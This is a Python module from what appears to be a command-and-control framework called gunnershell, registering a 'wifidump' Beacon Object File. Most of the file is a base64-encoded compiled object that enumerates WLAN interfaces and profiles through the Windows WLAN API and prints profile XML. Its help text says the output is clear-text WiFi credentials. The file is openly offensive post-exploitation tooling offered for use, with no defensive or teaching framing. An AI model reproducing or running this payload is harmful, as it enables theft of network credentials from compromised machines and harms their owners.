import base64
from typing import List

# BOF imports
from core.gunnershell.bofs.base import Bof, register

# Session Management
from core.session_handlers import session_manager

from colorama import Style, Fore
brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
reset = Style.RESET_ALL

@register("wifidump")
class WifiDumpBof(Bof):
	base64bof: str = "ZIYHAAAAAABQCAAAEQAAAAAABAAudGV4dAAAAAAAAAAAAAAAkAQAACwBAAAkBwAAAAAAABUAAAAgAFBgLmRhdGEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQABQwC5ic3MAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAUMAucmRhdGEAAAAAAAAAAAAAAAEAALwFAAAAAAAAAAAAAAAAAABAAFBALnhkYXRhAAAAAAAAAAAAACQAAAC8BgAAAAAAAAAAAAAAAAAAQAAwQC5wZGF0YQAAAAAAAAAAAAAkAAAA4AYAAPYHAAAAAAAACQAAAEAAMEAvNAAAAAAAAAAAAAAAAAAAIAAAAAQHAAAAAAAAAAAAAAAAAABAAFBAVUiJ5UiB7PAAAABIiU0QiVUYSMdF0AAAAADHRfQCAAAAx0XMAAAAAMdF8AAAAADHRewAAAAAx0XoAAAAAMdFyAAAAABmD+/ADxGFcP///w8RRYAPEUWQDxFFoA8RRa5Ix4Vo////AAAAAMeFZP///wAAAABIx4VY////AAAAAEjHReAAAAAASMeFUP///wAAAABIx0XYAAAAAEiNTdBIjVXMi0X0SYnJSYnQugAAAACJwUiLBQAAAAD/0IlF8IN98AB0HotF8EGJwEiNBQAAAABIicK5AAAAAEiLBQAAAAD/0EiLRdBIjZVY////SYnQugAAAABIicFIiwUAAAAA/9CJRfCDffAAdCOLRfBBicBIjQUoAAAASInCuQAAAABIiwUAAAAA/9DpZAEAAMdF/AAAAADpRgEAAEiLlVj///+LRfxIacAUAgAASAHQSIPACEiJReBIi1XgSItF0EiNjVD///9JiclBuAAAAABIicFIiwUAAAAA/9CJRfCDffAAdCqLRfBBicBIjQVYAAAASInCuQAAAABIiwUAAAAA/9DHRewBAAAA6c8AAADHRfgAAAAA6bEAAABIi41Q////i1X4SInQSMHgB0gB0EjB4AJIAchIg8AISIlF2EyLRdhIi1XgSItF0EiNjWT///9IiUwkMEiNTchIiUwkKEiNjWj///9IiUwkIEG5AAAAAEiJwUiLBQAAAAD/0IlF8IN98AB0IItF8EGJwEiNBYgAAABIicK5AAAAAEiLBQAAAAD/0OsiSIuFaP///0mJwEiNBa4AAABIicK5AAAAAEiLBQAAAAD/0INF+AFIi4VQ////iwA5RfgPgj3///+DRfwBSIuFWP///4sAOUX8D4Ko/v//SIuFUP///0iFwHQeSIuFUP///0iJwUiLBQAAAAD/0EjHhVD///8AAAAASIuFWP///0iFwHQeSIuFWP///0iJwUiLBQAAAAD/0EjHhVj///8AAAAAkEiBxPAAAABdw1VIieVIg+wQSIlNEEiJVRhIg30QAHQLSIN9GAAPhYcAAAC4AAAAAOm9AAAASItFEA+3AGaD+EB2GUiLRRAPtwBmg/hadwxIi0UQD7cAg8Ag6wdIi0UQD7cAZolF/kiLRRgPtwBmg/hAdhlIi0UYD7cAZoP4WncMSItFGA+3AIPAIOsHSItFGA+3AGaJRfwPt0X+ZjtF/HQHuAAAAADrSkiDRRACSINFGAJIi0UQD7cAZoXAdBBIi0UYD7cAZoXAD4Vn////SItFEA+3AGaFwHUTSItFGA+3AGaFwHUHuAEAAADrBbgAAAAASIPEEF3DVUiJ5UiD7EBIiU0QiVUYSMdF+AAAAACLTRhIi1UQSI1F4EGJyEiJwUiLBQAAAAD/0EiNReC6AAAAAEiJwUiLBQAAAAD/0EiJRfhIg334AHQjSItF+A+3AGaFwHQXSItF+EiNFcgAAABIicHoof7//4XAdBGLVRhIi0UQSInB6J/7///rIEiLRfhJicBIjQXYAAAASInCuQ0AAABIiwUAAAAA/9CQSIPEQF3DkJCQkJCQkFdsYW5PcGVuSGFuZGxlIGZhaWxlZCB3aXRoIGVycm9yOiAldQoAAABXbGFuRW51bUludGVyZmFjZXMgZmFpbGVkIHdpdGggZXJyb3I6ICV1CgAAAAAAAABXbGFuR2V0UHJvZmlsZUxpc3QgZmFpbGVkIHdpdGggZXJyb3I6ICV1CgAAAAAAAABXbGFuR2V0UHJvZmlsZSBmYWlsZWQgd2l0aCBlcnJvcjogJXUKAFByb2ZpbGUgWE1MIHN0cmluZzogJXdzCgAAZQBuAHUAbQAAAAAAAAAAAFVua25vd24gbW9kZSAnJWxzJy4gVXNlOiBlbnVtCgAAAAAAAAAAAAABCwQFCwEeAAQDAVABCAMFCBIEAwFQAAABCAMFCHIEAwFQAAAAAAAA7wIAAAAAAADvAgAA3gMAAAwAAADeAwAAiQQAABgAAABHQ0M6IChHTlUpIDE0LXdpbjMyAAAAAAAAAAAAAAAAALUAAAAJAAAABADNAAAABQAAAAQA3AAAAAoAAAAEAPsAAAALAAAABAATAQAABQAAAAQAIgEAAAoAAAAEAHMBAAAMAAAABACLAQAABQAAAAQAmgEAAAoAAAAEABQCAAANAAAABAAsAgAABQAAAAQAOwIAAAoAAAAEAFACAAAFAAAABABfAgAACgAAAAQAqgIAAA4AAAAEANQCAAAOAAAABAAJBAAADwAAAAQAHgQAABAAAAAEAEIEAAAFAAAABABtBAAABQAAAAQAfAQAAAoAAAAEAAAAAAADAAAAAwAEAAAAAwAAAAMACAAAAAcAAAADAAwAAAADAAAAAwAQAAAAAwAAAAMAFAAAAAcAAAADABgAAAADAAAAAwAcAAAAAwAAAAMAIAAAAAcAAAADAHdpZmllbnVtAAAAAAEAIAACAQAAAAAAAAAAAAAAAAAAAAAAAGdvAAAAAAAA3gMAAAEAIAACAC50ZXh0AAAAAAAAAAEAAAADAYkEAAAVAAAAAAAAAAAAAAAAAC5yZGF0YQAAAAAAAAQAAAADAfcAAAAAAAAAAAAAAAAAAAAAAC54ZGF0YQAAAAAAAAUAAAADASQAAAAAAAAAAAAAAAAAAAAAAAAAAAAPAAAAAAAAAAAAAAACAAAAAAAsAAAAAAAAAAAAAAACAAAAAAA/AAAAAAAAAAAAAAACAAAAAABgAAAAAAAAAAAAAAACAAAAAACBAAAAAAAAAAAAAAACAAAAAACeAAAAAAAAAAAAAAACAAAAAAC7AAAAAAAAAAAAAAACAAAAAADRAAAAAAAAAAAAAAACAOkAAAAucmRhdGEkenp6AF9faW1wX1dMQU5BUEkkV2xhbk9wZW5IYW5kbGUAX19pbXBfQmVhY29uUHJpbnRmAF9faW1wX1dMQU5BUEkkV2xhbkVudW1JbnRlcmZhY2VzAF9faW1wX1dMQU5BUEkkV2xhbkdldFByb2ZpbGVMaXN0AF9faW1wX1dMQU5BUEkkV2xhbkdldFByb2ZpbGUAX19pbXBfV0xBTkFQSSRXbGFuRnJlZU1lbW9yeQBfX2ltcF9CZWFjb25EYXRhUGFyc2UAX19pbXBfQmVhY29uRGF0YUV4dHJhY3QA"

	def help_menu():
		menu = """
Enumerates WiFi interfaces and dumps clear text credentials
Usage: bofexec wifidump
"""
		print(brightgreen + menu + reset)
		return